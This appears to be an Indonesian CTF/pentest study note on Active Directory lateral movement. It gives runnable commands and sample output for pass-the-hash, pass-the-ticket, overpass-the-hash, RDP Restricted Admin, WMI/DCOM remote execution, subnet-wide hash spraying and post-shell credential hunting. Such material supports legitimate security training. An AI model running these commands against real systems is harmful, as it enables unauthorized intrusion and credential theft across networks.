---
id: "42"
title: "🧭 Workflow 42 — Lateral Movement"
category: "4. Active Directory"
categoryId: "ad"
filename: "42_lateral_movement_workflow.md"
refs_out: ["05","06","11","12","14a","14b","35","36","37","38","41","43","44","45","46"]
refs_in: ["04","05","14b","22","35","37","39","40","41","43","44","45","46","47","64"]
---

# 🧭 Workflow 42 — Lateral Movement

> **Category:** Active Directory / Post-Compromise / Lateral Movement  
> **Difficulty:** Intermediate  
> **Type:** Credential Reuse / Remote Execution / Pivoting  
> **Prerequisites:**  
> ← [**File 37: Kerberoasting & AS-REP Roasting**](/docs/kerberoasting-asreproasting)  
> ← [**File 38: AD ACL Abuse**](/docs/ad-acl-abuse)  
> ← [**File 41: NTLM Relay**](/docs/ntlm-relay)  
> **Next:**  
> → [**File 43: Domain Persistence**](/docs/domain-persistence)  
> → [**File 44: Linux PrivEsc**](/docs/linux-privesc)  
> → [**File 45: Windows PrivEsc**](/docs/windows-privesc)

---

# 🎯 0. FONDASI LATERAL MOVEMENT

## 0.1 🚶 Apa Itu Lateral Movement?

**Lateral movement** adalah proses berpindah dari satu sistem yang sudah berhasil diakses ke sistem lain dalam environment yang sama menggunakan credential, ticket, certificate, atau access material yang sudah tersedia.

Analogi paling mudah:

> Kamu sudah masuk ke sebuah gedung menggunakan kartu akses lantai 1.

Tetapi tujuanmu bukan lantai 1.

Kamu melihat ada:

```text
LANTAI 1
   │
   ├── komputer resepsionis
   ├── printer
   └── workstation
```

Kamu kemudian menemukan bahwa:

```text
Kartu yang sama
   │
   ├── membuka pintu lantai 2
   └── membuka ruang server
```

Maka kamu bergerak:

```text
Lantai 1
   │
   │ credential reuse
   ▼
Lantai 2
   │
   │ credential reuse
   ▼
Ruang Server
```

Itulah konsep lateral movement.

---

# 0.1.1 🔀 Lateral Movement vs Privilege Escalation

Dua konsep ini sering tertukar.

### Privilege Escalation

Bergerak:

```text
LOW PRIVILEGE
     │
     ▼
HIGH PRIVILEGE
```

Contoh:

```text
user
 │
 ▼
Administrator
```

Tetapi masih pada:

```text
MACHINE A
```

---

### Lateral Movement

Bergerak:

```text
MACHINE A
    │
    ▼
MACHINE B
```

Privilege dapat sama:

```text
user@A
  │
  ▼
user@B
```

atau meningkat:

```text
user@A
  │
  └── credential reuse
          │
          ▼
Administrator@B
```

---

## 0.1.2 🧠 Diagram Perbandingan

```text
PRIVILEGE ESCALATION
─────────────────────

Machine A
    │
    │ privilege escalation
    ▼
user ──────────────► Administrator
          SAME HOST


LATERAL MOVEMENT
────────────────

Machine A
    │
    │ credential/ticket
    ▼
Machine B
    │
    ▼
Machine C
```

Kombinasi yang sering terjadi dalam CTF:

```text
Initial Foothold
       │
       ▼
Privilege Escalation
       │
       ▼
Credential Collection
       │
       ▼
Lateral Movement
       │
       ▼
New Host
       │
       ▼
Privilege Escalation
       │
       ▼
Credential Collection
       │
       ▼
Lateral Movement
       │
       ▼
Domain Compromise
```

---

# 0.1.3 🔄 Kenapa Lateral Movement Sangat Penting di Active Directory?

Karena environment AD sering memiliki:

```text
credential reuse
shared accounts
service accounts
password reuse
local administrator password reuse
Kerberos tickets
machine accounts
certificate authentication
```

Contoh:

```text
WEB01
 │
 └── admin password = Password123!

FILE01
 │
 └── local admin password = Password123!

SQL01
 │
 └── service account = Password123!
```

Attacker mendapat:

```text
Password123!
```

Lalu mulai mencoba:

```text
WEB01
FILE01
SQL01
```

Inilah alasan:

> **Satu credential yang valid tidak boleh dipandang hanya sebagai akses ke satu host.**

---

# 0.1.4 🧩 Credential Reuse

Misalnya:

```text
Compromised:
DOMAIN\john
```

Kemudian validasi ke subnet:

```text
10.10.10.5   [+]
10.10.10.10  [-]
10.10.10.20  [+]
10.10.10.30  [+]
```

Artinya satu credential menghasilkan beberapa kemungkinan path:

```text
              john
               │
      ┌────────┼────────┐
      ▼        ▼        ▼
    WEB01    FILE01    SQL01
```

---

# 0.1.5 🕒 Kapan Lateral Movement Dilakukan?

Secara sederhana:

```text
RECON
  │
  ▼
INITIAL ACCESS
  │
  ▼
ENUMERATION
  │
  ▼
CREDENTIAL ACCESS
  │
  ▼
LATERAL MOVEMENT
  │
  ▼
PRIVILEGE ESCALATION
  │
  ▼
LATERAL MOVEMENT
  │
  ▼
OBJECTIVE
```

Dalam praktik, urutannya **bisa berulang**.

```text
FOOTHOLD
   │
   ▼
ENUM
   │
   ▼
CRED
   │
   ▼
LATERAL
   │
   ▼
NEW HOST
   │
   ├── more creds
   ├── more ACL
   └── more services
          │
          ▼
       repeat
```

---

# 🪪 0.2 Credential Types yang Digunakan

|Credential Type|Format|Dipakai Untuk|Cara Dapat|
|---|---|---|---|
|**NT Hash**|`31d6cfe0...` atau `LM:NT`|Pass-the-Hash|SAM, NTDS, secretsdump, relay chain|
|**Kerberos TGT**|`.ccache`, `.kirbi`|Pass-the-Ticket|`getTGT.py`, Rubeus, PKINIT|
|**Kerberos TGS**|`.ccache`, `.kirbi`|Access ke service tertentu|Kerberos enumeration/S4U|
|**Plaintext Password**|`Password123!`|SMB, WinRM, RDP, SSH, MSSQL, Kerberos|cracking, memory, config|
|**Certificate + Private Key**|`.pfx`, `.pem`|PKINIT / certificate authentication|AD CS|
|**SSH Private Key**|`id_rsa`, `.pem`|SSH|file discovery, credentials|

---

## 0.2.1 🔐 NT Hash Format

Ada dua format yang sangat sering muncul.

### Format LM:NT

```text
aad3b435b51404eeaad3b435b51404ee:31d6cfe0...
```

Bagian:

```text
LM_HASH : NT_HASH
```

---

### Format NT Only

```text
31d6cfe0d16ae931b73c59d7e0c089c0
```

---

### ⚠️ Kenapa Ini Penting?

Tool tertentu mengharapkan:

```text
LM:NT
```

sementara tool lain menerima:

```text
NT only
```

Contoh Impacket:

```bash
# Impacket umumnya menggunakan format LM:NT
python3 /opt/impacket/examples/psexec.py \
    -hashes "$NT_HASH" \
    "$DOMAIN/$USERNAME@$TARGET_IP"
```

Jika variable berisi:

```bash
export NT_HASH="aad3b435b51404eeaad3b435b51404ee:NTHASH"
```

maka itu sudah sesuai format `LM:NT`.

NetExec:

```bash
# NetExec -H menerima NT hash
netexec smb "$TARGET_IP" \
    -u "$USERNAME" \
    -H "NTHASH"
```

Jadi:

```text
Impacket
   └── sering: LM:NT

NetExec -H
   └── NT hash
```

> Selalu cek `--help` pada versi tool lokal karena syntax dapat berbeda antar versi.

---

# 0.3 🌐 Protocol yang Digunakan untuk Lateral Movement

|Protocol|Port|Tool|Kebutuhan|
|---|--:|---|---|
|SMB / PsExec|445|`psexec.py`|SMB + administrative access|
|WinRM|5985/5986|`evil-winrm`|WinRM enabled + authorized account|
|WMI|135 + dynamic RPC|`wmiexec.py`|WMI/DCOM permissions|
|DCOM|135 + dynamic RPC|`dcomexec.py`|DCOM access|
|RDP|3389|`xfreerdp`|RDP enabled + logon rights|
|SSH|22|`ssh`|SSH enabled + credentials/key|
|MSSQL|1433|`mssqlclient.py`|SQL authentication / Windows auth + privileges|

---

# 0.3.1 🧠 Cara Memilih Protocol

```text
TARGET HOST
     │
     ├── 445 open?
     │      │
     │      ├── Admin?
     │      │    └── psexec / smbexec / wmiexec
     │      │
     │      └── Share only?
     │           └── smbclient
     │
     ├── 5985/5986 open?
     │      └── evil-winrm
     │
     ├── 3389 open?
     │      └── RDP
     │
     ├── 22 open?
     │      └── SSH
     │
     └── 1433 open?
            └── MSSQL
```

---

# 0.4 🧠 Mental Model Lateral Movement

```text
             INITIAL FOOTHOLD
                    │
                    ▼
          CREDENTIAL COLLECTION
          ┌─────────────────────┐
          │ password            │
          │ NT hash             │
          │ TGT/TGS             │
          │ certificate         │
          │ SSH key             │
          └─────────┬───────────┘
                    │
                    ▼
          TARGET IDENTIFICATION
          ┌─────────────────────┐
          │ Who can I reach?    │
          │ Which ports open?   │
          │ Which credential?   │
          └─────────┬───────────┘
                    │
                    ▼
           LATERAL MOVEMENT
                    │
                    ▼
               NEW HOST
                    │
          ┌─────────┴─────────┐
          ▼                   ▼
     More creds          More privilege
          │                   │
          └─────────┬─────────┘
                    ▼
                 REPEAT
```

---

# 🧰 1. SETUP ENVIRONMENT

## 🖥️ 1.0 Setup Tmux Multi-Terminal Workspace (Rekomendasi Pemula)

Lateral movement membutuhkan manajemen multi-terminal yang efisien (menjalankan NetExec, membuka interactive shells, dan memantau output/loot):

```bash
# Buka session tmux baru khusus lateral movement
tmux new -s lateral

# Shortcut Split Panel Tmux:
# Ctrl+B lalu %  -> Split Vertikal
# Ctrl+B lalu "  -> Split Horizontal
# Ctrl+B lalu Arrow Key -> Pindah Panel
```

```text
┌─────────────────────────────────┬─────────────────────────────────┐
│           PANEL 1               │           PANEL 2               │
│      NetExec / Validation       │   Interactive Shell / Execution │
│   (Credential Spray & Recon)    │   (psexec / wmiexec / winrm)    │
├─────────────────────────────────┴─────────────────────────────────┤
│                           PANEL 3                                 │
│             Credential Harvesting & Monitoring Output             │
│        (secretsdump / lsass dump / loot monitoring / proxy)       │
└───────────────────────────────────────────────────────────────────┘
```

---

## 1.1 ⚙️ Setup Variabel

```bash
# Domain name
export DOMAIN="domain.local"

# Domain Controller IP
export DC_IP="10.10.10.10"

# Current target
export TARGET_IP="10.10.10.20"

# Username
export USERNAME="user"

# Plaintext password, if available
export PASSWORD="password"

# NT hash.
# Format for Impacket: LM:NT
export NT_HASH="aad3b435b51404eeaad3b435b51404ee:NTHASH"

# Attacker/VPN address
export LHOST="10.10.14.X"

# Optional target hostname
export TARGET_HOSTNAME="target.domain.local"

# Create workspace
mkdir -p lateral/{loot,tickets,shells,logs}
```

---

# 1.1.1 🧪 Verify Tools

```bash
# NetExec
which netexec

# Impacket
which psexec.py
which wmiexec.py
which smbexec.py
which secretsdump.py

# Evil-WinRM
which evil-winrm

# RDP
which xfreerdp

# SSH
which ssh

# MSSQL
which mssqlclient.py
```

---

# 1.2 🔎 Cara Cek Credential yang Dimiliki

Gunakan checklist:

```text
[ ] Plaintext password
[ ] NT hash
[ ] Kerberos TGT
[ ] Kerberos TGS
[ ] Certificate/PFX
[ ] SSH private key
```

Kemudian tentukan:

```text
PLAINTEXT PASSWORD
       │
       ├── SMB
       ├── WinRM
       ├── RDP
       ├── SSH
       └── Kerberos

NT HASH
       │
       ├── SMB
       ├── WMI
       ├── some WinRM configurations
       └── getTGT → Kerberos

TGT
       │
       └── Kerberos services

PFX
       │
       └── PKINIT → TGT

SSH KEY
       │
       └── SSH
```

---

# 🔴 2. PASS-THE-HASH (PTH)

## 2.1 🧠 Konsep PTH

Pass-the-Hash berarti menggunakan **NT hash** sebagai authentication material tanpa mengetahui plaintext password.

```text
PASSWORD
    │
    │ password-derived
    ▼
NT HASH
    │
    │ Pass-the-Hash
    ▼
NTLM AUTHENTICATION
    │
    ▼
TARGET
```

Tidak perlu:

```text
password = "Password123!"
```

Jika punya:

```text
NT hash = 32 hex characters
```

pada protokol yang mendukung NTLM-based authentication, hash tersebut dapat digunakan.

---

# 2.1.1 🔁 PTH vs Password

Password:

```text
username + password
```

PTH:

```text
username + NT hash
```

---

# 2.1.2 🌐 Protocol yang Perlu Diperhatikan

Praktis untuk CTF:

```text
SMB       → ✅
WMI       → ✅
WinRM     → ✅ dalam kondisi/implementation tertentu
RDP       → ⚠️ bukan standard PTH path
Kerberos  → ❌ bukan PTH
SSH       → ❌
```

Untuk Kerberos:

```text
NT hash
   │
   ▼
Overpass-the-Hash
   │
   ▼
TGT
   │
   ▼
Kerberos
```

---

# 2.2 ✅ PTH dengan NetExec — Validasi Awal

> **Ini selalu menjadi langkah pertama. Jangan langsung menjalankan `psexec` hanya karena kamu menemukan sebuah hash.**

```bash
# Validate the NT hash against one SMB target
netexec smb "$TARGET_IP" \
    -u "$USERNAME" \
    -H "NTHASH" \
    --no-bruteforce
```

Scan subnet:

```bash
# Validate credential across the subnet
netexec smb 10.10.10.0/24 \
    -u "$USERNAME" \
    -H "NTHASH" \
    --no-bruteforce
```

---

# 2.2.1 📊 Interpretasi NetExec

Contoh:

```text
SMB  10.10.10.20  445  FILE01  [+] domain.local\user
```

Artinya:

```text
credential valid
```

Jika:

```text
SMB  10.10.10.20  445  FILE01  [+] domain.local\user (Pwn3d!)
```

maka:

```text
credential valid
+
NetExec menentukan identity memiliki local administrative access
```

**`Pwn3d!` bukan berarti Domain Admin.**

Bisa saja:

```text
local Administrator
local admin-equivalent
domain account with local admin rights
```

---

# 2.2.2 📋 Output Interpretation

|Output|Arti|Langkah berikut|
|---|---|---|
|`[+] user`|Credential valid|Check shares/services|
|`[+] user (Pwn3d!)`|Admin-level access pada target menurut NetExec|Remote execution|
|`[-]`|Authentication gagal|Check hash/user/target|
|`STATUS_LOGON_FAILURE`|Logon ditolak|Credential/account/target issue|
|Host unreachable|Network problem|Check routing/firewall|

---

# 2.2.3 🔎 Jangan Hanya Cek Satu Host

Jangan:

```text
Hash
 │
 └── TARGET01
```

Lakukan:

```text
Hash
 │
 ├── DC01
 ├── WEB01
 ├── FILE01
 ├── SQL01
 └── USER-PC
```

Karena credential yang terlihat tidak berguna pada:

```text
WEB01
```

bisa ternyata:

```text
(Pwn3d!)
```

pada:

```text
FILE01
```

---

# 2.3 💻 PTH dengan psexec.py

Setelah validasi:

```bash
# Use NTLM hash to authenticate to SMB
python3 /opt/impacket/examples/psexec.py \
    -hashes "$NT_HASH" \
    "$DOMAIN/$USERNAME@$TARGET_IP"
```

Contoh output:

```text
Impacket v0.x

[*] Requesting shares on 10.10.10.20.....
[*] Found writable share ADMIN$
[*] Uploading file xxxxxxxx.exe
[*] Opening SVCManager on 10.10.10.20.....
[*] Creating service xxxxxxxx
[*] Starting service xxxxxxxx
[!] Press help for extra shell commands
C:\Windows\system32>
```

---

# 2.3.1 🔧 Kenapa psexec Bisa Memberikan SYSTEM?

Secara konsep:

```text
Attacker
   │
   │ SMB
   ▼
ADMIN$
   │
   │ upload service binary
   ▼
Service Control Manager
   │
   ▼
Service
   │
   ▼
SYSTEM
```

Jadi psexec bukan sekadar:

```text
"remote command"
```

tetapi menggunakan mekanisme:

```text
SMB
+
Service Control Manager
```

---

# 2.3.2 🧾 Artifact psexec

Potential artifacts:

```text
uploaded executable
temporary service
Service Control Manager events
SMB activity
process creation
```

Jadi:

```text
psexec
=
powerful
+
noisy
```

---

# 2.4 🧪 PTH dengan wmiexec.py

```bash
# Authenticate using NT hash and execute through WMI
python3 /opt/impacket/examples/wmiexec.py \
    -hashes "$NT_HASH" \
    "$DOMAIN/$USERNAME@$TARGET_IP"
```

Command langsung:

```bash
# Execute one command without entering an interactive shell
python3 /opt/impacket/examples/wmiexec.py \
    -hashes "$NT_HASH" \
    "$DOMAIN/$USERNAME@$TARGET_IP" \
    "whoami"
```

Contoh:

```text
[*] SMBv3.0 dialect used
[!] Launching semi-interactive shell
C:\> whoami
domain\user
```

---

# 2.4.1 🧠 psexec vs wmiexec

```text
psexec
  │
  ├── service creation
  ├── binary/service artifact
  └── typically SYSTEM

wmiexec
  │
  ├── WMI
  ├── no traditional psexec-style service
  └── commonly executes as supplied account
```

---

# 2.5 ⚙️ PTH dengan smbexec.py

```bash
# Alternative SMB remote execution
python3 /opt/impacket/examples/smbexec.py \
    -hashes "$NT_HASH" \
    "$DOMAIN/$USERNAME@$TARGET_IP"
```

---

# 2.5.1 📊 psexec vs wmiexec vs smbexec

|Aspek|psexec|wmiexec|smbexec|
|---|---|---|---|
|Transport|SMB + SCM|WMI + SMB|SMB + Service/SCM technique|
|Typical privilege|SYSTEM jika authorized|Supplied account context|SYSTEM jika authorized|
|Binary/service artifact|Ya|Tidak seperti psexec|Berbeda/lebih minimal|
|Noise|🔴 HIGH|🟠 MEDIUM|🟠 MEDIUM|
|Typical ports|445|135 + 445|445|
|Kapan pakai|Butuh SYSTEM|WMI available|Alternatif psexec|

> **Jangan membuat klaim bahwa wmiexec selalu “lebih stealth”.** Visibility tergantung logging, EDR, WMI telemetry, process creation, SMB activity, dan environment.

---

# 2.6 🪟 PTH dengan Evil-WinRM

Install:

```bash
# Install Evil-WinRM
gem install evil-winrm
```

PTH:

```bash
# Authenticate to WinRM using NT hash
evil-winrm \
    -i "$TARGET_IP" \
    -u "$USERNAME" \
    -H "NTHASH"
```

Contoh:

```text
Evil-WinRM shell v3.x

Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\user\Documents>
```

---

# 2.6.1 🔧 Kenapa Evil-WinRM Menarik?

Jika WinRM tersedia:

```text
Evil-WinRM
    │
    ▼
PowerShell session
    │
    ├── upload
    ├── download
    ├── command execution
    └── PowerShell
```

---

# 2.7 🔎 Cek WinRM

NetExec:

```bash
# Check WinRM availability and authentication
netexec winrm "$TARGET_IP" \
    -u "$USERNAME" \
    -H "NTHASH"
```

Nmap:

```bash
# Scan WinRM ports
nmap \
    -p 5985,5986 \
    "$TARGET_IP"
```

HTTP check:

```bash
# Basic WinRM endpoint connectivity test
curl -s \
    "http://$TARGET_IP:5985/wsman"
```

---

# 🟢 3. PASS-THE-TICKET (PTT)

## 3.1 🎫 Konsep PTT

PTH:

```text
NT HASH
   │
   ▼
NTLM
   │
   ▼
TARGET
```

PTT:

```text
KERBEROS TICKET
      │
      ▼
Kerberos authentication
      │
      ▼
TARGET SERVICE
```

---

# 3.1.1 🧠 TGT vs TGS

```text
TGT
 │
 │ request service ticket
 ▼
KDC
 │
 ▼
TGS
 │
 ▼
SERVICE
```

TGT adalah credential untuk meminta TGS.

TGS adalah ticket untuk service tertentu.

---

# 3.2 📦 `.ccache` vs `.kirbi`

|Format|Environment|Common Tool|
|---|---|---|
|`.ccache`|Linux|MIT Kerberos / Impacket|
|`.kirbi`|Windows|Rubeus / Mimikatz|

Mental model:

```text
Kerberos Ticket
      │
      ├── Linux → CCACHE
      │
      └── Windows → KIRBI
```

Convert menggunakan Impacket utility yang tersedia:

```bash
# Convert Kerberos ticket between formats
python3 /opt/impacket/examples/ticketConverter.py \
    "ticket.kirbi" \
    "ticket.ccache"
```

Reverse:

```bash
# Convert CCACHE back to KIRBI
python3 /opt/impacket/examples/ticketConverter.py \
    "ticket.ccache" \
    "ticket.kirbi"
```

> Nama utility/path dapat berbeda pada installation tertentu.

---

# 3.3 🎟️ Dapatkan TGT dari Password

```bash
# Request TGT using plaintext password
python3 /opt/impacket/examples/getTGT.py \
    "$DOMAIN/$USERNAME:$PASSWORD" \
    -dc-ip "$DC_IP"
```

Expected:

```text
[*] Saving ticket in user.ccache
```

---

# 3.3.1 🔑 Dapatkan TGT dari NT Hash

Ini adalah **Overpass-the-Hash** primitive:

```bash
# Request Kerberos TGT using NT hash
python3 /opt/impacket/examples/getTGT.py \
    "$DOMAIN/$USERNAME" \
    -hashes "$NT_HASH" \
    -dc-ip "$DC_IP"
```

Expected:

```text
[*] Saving ticket in user.ccache
```

---

# 3.4 🌐 Set `KRB5CCNAME`

```bash
# Point Kerberos-aware applications to the credential cache
export KRB5CCNAME="$PWD/user.ccache"

# Verify ticket
klist
```

Contoh:

```text
Credentials cache: FILE:/home/user/user.ccache
Principal: user@DOMAIN.LOCAL

Valid starting       Expires              Service principal
09/08/2026 14:00     09/09/2026 00:00    krbtgt/DOMAIN.LOCAL@DOMAIN.LOCAL
```

---

# 3.4.1 🧠 Cara Membaca `klist`

Perhatikan:

```text
Principal
```

contoh:

```text
user@DOMAIN.LOCAL
```

dan:

```text
krbtgt/DOMAIN.LOCAL
```

Artinya TGT untuk domain tersedia.

---

# 3.5 💻 Lateral Movement dengan Kerberos Ticket

## psexec

```bash
# Use Kerberos authentication
python3 /opt/impacket/examples/psexec.py \
    -k \
    -no-pass \
    "$DOMAIN/$USERNAME@$TARGET_HOSTNAME"
```

## wmiexec

```bash
# Use Kerberos ticket for WMI
python3 /opt/impacket/examples/wmiexec.py \
    -k \
    -no-pass \
    "$DOMAIN/$USERNAME@$TARGET_HOSTNAME"
```

## smbclient

```bash
# Access SMB using Kerberos ticket
smbclient \
    "//$TARGET_HOSTNAME/C$" \
    -k \
    --no-pass
```

---

# 3.5.1 ⚠️ Kenapa Hostname Penting?

Kerberos menggunakan SPN.

Contoh:

```text
cifs/FILE01.domain.local
```

Berbeda dengan:

```text
cifs/10.10.10.20
```

Jika ticket yang tersedia adalah:

```text
cifs/FILE01.domain.local
```

tetapi kamu mengakses:

```text
10.10.10.20
```

tool bisa gagal mendapatkan/menemukan service ticket yang sesuai.

---

# 3.5.2 🧠 Hostname vs IP

Gunakan:

```text
Kerberos
   │
   ▼
Hostname
   │
   ▼
SPN
```

Bukan:

```text
Kerberos
   │
   ▼
IP address
```

---

# 3.5.3 📝 `/etc/hosts`

Jika DNS tidak resolve:

```bash
# Map target IP to the correct hostname
echo "$TARGET_IP $TARGET_HOSTNAME" |
    sudo tee -a /etc/hosts
```

Contoh:

```bash
# Example mapping
echo "10.10.10.20 FILE01.domain.local FILE01" |
    sudo tee -a /etc/hosts
```

Kemudian:

```bash
# Verify DNS/hosts resolution
getent hosts "$TARGET_HOSTNAME"
```

---

# 3.6 ⏰ Clock Sync

Kerberos sangat sensitif terhadap timestamp.

```bash
# Show current time
date

# Show time synchronization state
timedatectl
```

Pada lab:

```bash
# Synchronize time against the DC when appropriate
sudo ntpdate "$DC_IP"
```

Kemudian:

```bash
# Verify
date
```

Mental model:

```text
Kerberos error
      │
      ▼
Check time
      │
      ▼
Check hostname/SPN
      │
      ▼
Check ticket
```

---

# 🔄 4. OVERPASS-THE-HASH

## 4.1 🧠 Konsep

Overpass-the-Hash menjembatani:

```text
NTLM credential
      │
      ▼
Kerberos
```

Flow:

```text
NT HASH
   │
   ▼
getTGT.py
   │
   ▼
KERBEROS TGT
   │
   ▼
CCACHE
   │
   ▼
Kerberos service
```

---

# 4.1.1 🔀 PTH vs OPtH

### PTH

```text
NT hash
  │
  ▼
NTLM
  │
  ▼
SMB/WMI/etc.
```

### Overpass-the-Hash

```text
NT hash
  │
  ▼
TGT
  │
  ▼
Kerberos
```

---

# 4.2 🐍 Overpass-the-Hash dengan Impacket

```bash
# Step 1: obtain TGT using NT hash
python3 /opt/impacket/examples/getTGT.py \
    "$DOMAIN/$USERNAME" \
    -hashes "$NT_HASH" \
    -dc-ip "$DC_IP"

# Step 2: load TGT
export KRB5CCNAME="$PWD/$USERNAME.ccache"

# Step 3: use Kerberos against target
python3 /opt/impacket/examples/wmiexec.py \
    -k \
    -no-pass \
    "$DOMAIN/$USERNAME@$TARGET_HOSTNAME"
```

---

# 4.2.1 🧠 Kapan PTH vs OPtH?

|Kondisi|Pilihan|
|---|---|
|Target menerima NTLM|PTH|
|Target/service membutuhkan Kerberos|OPtH|
|Punya NT hash tetapi tidak password|OPtH dapat menghasilkan TGT|
|Sudah punya TGT|PTT|
|Butuh service-specific ticket|TGT → TGS|

---

# 🖥️ 5. RDP LATERAL MOVEMENT

## 5.1 🖥️ Kapan Pakai RDP?

Gunakan RDP ketika:

```text
Target
 │
 ├── TCP 3389 open
 ├── RDP enabled
 └── account memiliki RDP logon rights
```

RDP berguna ketika:

```text
GUI diperlukan
```

atau:

```text
remote shell tidak nyaman
```

---

# 5.2 🔑 RDP dengan Password

```bash
# Connect using username/password
xfreerdp \
    /v:"$TARGET_IP" \
    /u:"$USERNAME" \
    /p:"$PASSWORD" \
    /d:"$DOMAIN" \
    +clipboard \
    /dynamic-resolution
```

Flag:

```text
/v:                 → target
/u:                 → username
/p:                 → password
/d:                 → domain
+clipboard          → clipboard
/dynamic-resolution → dynamic window size
```

---

# 5.2.1 ✅ Contoh Output

```text
[INFO] Certificate details:
[INFO]   Subject: CN=TARGET
[INFO] Network Level Authentication: enabled
[INFO] Connected to 10.10.10.20:3389
```

---

# 5.3 🔐 RDP dengan PTH

RDP PTH **tidak sama** dengan SMB PTH.

Skenario tertentu menggunakan **Restricted Admin Mode** sehingga credential material yang diterima dapat berupa hash.

Check:

```bash
# First validate the credential and determine whether
# the target exposes relevant SMB/RPC functionality
netexec smb "$TARGET_IP" \
    -u "$USERNAME" \
    -H "NTHASH"
```

Pada target lab yang sudah dikonfigurasi untuk Restricted Admin:

```bash
# Use FreeRDP's pass-the-hash option where supported
xfreerdp \
    /v:"$TARGET_IP" \
    /u:"$USERNAME" \
    /d:"$DOMAIN" \
    /pth:"NTHASH" \
    +clipboard
```

> `Restricted Admin` adalah **prerequisite**, bukan sesuatu yang dapat diasumsikan aktif.

---

# 5.3.1 🧩 Restricted Admin Concept

Normal RDP:

```text
Password
   │
   ▼
RDP session
   │
   ▼
credentials may be delegated/cached
```

Restricted Admin:

```text
NT hash
  │
  ▼
RDP authentication
  │
  ▼
remote session
```

Ini adalah konfigurasi keamanan khusus dan tidak boleh dianggap default.

---

# 5.3.2 🔧 Cek Registry

Jika memiliki local administrative execution:

```bash
# Query the Restricted Admin registry value
netexec smb "$TARGET_IP" \
    -u "$USERNAME" \
    -H "NTHASH" \
    -x 'reg query HKLM\System\CurrentControlSet\Control\Lsa /v DisableRestrictedAdmin'
```

Interpretation:

```text
DisableRestrictedAdmin = 0
```

berarti:

```text
Restricted Admin enabled
```

Sedangkan:

```text
DisableRestrictedAdmin = 1
```

berarti:

```text
Restricted Admin disabled
```

---

# 5.3.3 ⚠️ Jangan Mengaktifkan Security Setting Tanpa Scope

Mengubah:

```text
DisableRestrictedAdmin
```

mengubah security posture target.

Pada CTF/lab ini mungkin sesuai challenge.

Pada real assessment:

```text
requires authorization
+
change documentation
```

---

# 5.4 🧯 Common RDP Errors

|Error|Penyebab|Solusi|
|---|---|---|
|Authentication failed|Credential salah / NLA|Validate credential|
|Unable to connect|RDP disabled / firewall|Scan 3389|
|Account restricted|User tidak punya RDP rights|Check local policy/group|
|CredSSP error|NLA/security mismatch|Check client/server security requirements|
|Connection reset|Server/network/EDR|Recheck connectivity/logs|
|Black screen|Session/display issue|Try different resolution/session|
|TLS certificate error|Certificate trust|Lab-only `/cert:ignore`|

Contoh:

```bash
# Lab-only certificate ignore
xfreerdp \
    /v:"$TARGET_IP" \
    /u:"$USERNAME" \
    /p:"$PASSWORD" \
    /d:"$DOMAIN" \
    /cert:ignore
```

---

# 🧪 6. WMI LATERAL MOVEMENT

## 6.1 💻 Remote Execution via WMI

Password:

```bash
# Execute through WMI using password
python3 /opt/impacket/examples/wmiexec.py \
    "$DOMAIN/$USERNAME:$PASSWORD@$TARGET_IP"
```

Hash:

```bash
# Execute through WMI using NT hash
python3 /opt/impacket/examples/wmiexec.py \
    -hashes "$NT_HASH" \
    "$DOMAIN/$USERNAME@$TARGET_IP"
```

One-liner:

```bash
# Run a single command remotely
python3 /opt/impacket/examples/wmiexec.py \
    "$DOMAIN/$USERNAME:$PASSWORD@$TARGET_IP" \
    "ipconfig /all"
```

---

# 6.1.1 🧠 WMI Flow

```text
ATTACKER
    │
    │ DCOM/RPC
    ▼
TARGET
    │
    ▼
WMI
    │
    ▼
Command
```

Typical dependencies:

```text
TCP 135
+
dynamic RPC ports
+
SMB in common Impacket workflows
```

---

# ⚙️ 6.2 DCOM Execution

```bash
# Execute through DCOM
python3 /opt/impacket/examples/dcomexec.py \
    -hashes "$NT_HASH" \
    "$DOMAIN/$USERNAME@$TARGET_IP"
```

Specify object when supported:

```bash
# Use MMC20.Application DCOM object
python3 /opt/impacket/examples/dcomexec.py \
    -object MMC20 \
    "$DOMAIN/$USERNAME:$PASSWORD@$TARGET_IP"
```

---

# 6.2.1 🧩 DCOM Objects

Common examples:

```text
MMC20.Application
ShellWindows
ShellBrowserWindow
```

Concept:

```text
Attacker
   │
   ▼
DCOM
   │
   ▼
COM object
   │
   ▼
command execution
```

Availability depends on OS configuration and permissions.

---

# 🚀 6.3 SETELAH DAPAT SHELL — 5 COMMAND PERTAMA YANG HARUS DIJALANKAN

Setelah berhasil spawn shell via `psexec`, `wmiexec`, `smbexec`, atau `evil-winrm`, segera jalankan immediate checklist berikut untuk memahami posisi dan privileges Anda:

### 🪟 Windows Target Checklist (5 Command Pertama)

```cmd
:: 1. Siapa aku & privilege apa yang aku miliki?
whoami /all

:: 2. Apa hostname dan IP configuration komputer ini?
hostname && ipconfig /all

:: 3. Apakah ada user lain yang sedang aktif login di machine ini?
query user 2>nul || qwinsta

:: 4. Siapa saja member dari local Administrators group?
net localgroup administrators

:: 5. Apakah ada credential tersimpan di Credential Manager?
cmdkey /list
```

---

### 🐧 Linux Target Checklist (5 Command Pertama)

```bash
# 1. Siapa aku dan grup apa saja yang aku ikuti?
id && whoami

# 2. Apa privilege sudo yang bisa aku jalankan?
sudo -l

# 3. Di mana aku? Apa hostname, IP, dan route network machine ini?
hostname && ip addr && ip route

# 4. Ada user lain dengan interactive shell di sistem ini?
cat /etc/passwd | grep -v nologin | grep -v false

# 5. Apakah ada SSH Private Keys di home directory / root?
find /home /root -name "id_rsa" -o -name "*.pem" 2>/dev/null
```

---

# 📂 7. SMB FILE OPERATIONS

## 7.1 🔎 SMB Share Enumeration

NetExec:

```bash
# Enumerate available shares
netexec smb "$TARGET_IP" \
    -u "$USERNAME" \
    -H "NTHASH" \
    --shares
```

Password:

```bash
# Enumerate shares with password
smbclient -L \
    "//$TARGET_IP" \
    -U "$DOMAIN\\$USERNAME%$PASSWORD"
```

---

# 7.1.1 Example Output

```text
Share        Permissions     Comment
-----        -----------     -------
ADMIN$       READ,WRITE      Remote Admin
C$           READ,WRITE      Default share
IPC$         READ            Remote IPC
Public       READ            Public files
```

---

# 7.2 📁 Akses SMB Share

```bash
# Connect to C$
smbclient \
    "//$TARGET_IP/C$" \
    -U "$DOMAIN\\$USERNAME%$PASSWORD"
```

Dengan NT hash:

```bash
# Authenticate with NT hash (Metode standard)
smbclient \
    "//$TARGET_IP/C$" \
    -U "$USERNAME" \
    --pw-nt-hash "NTHASH"
```

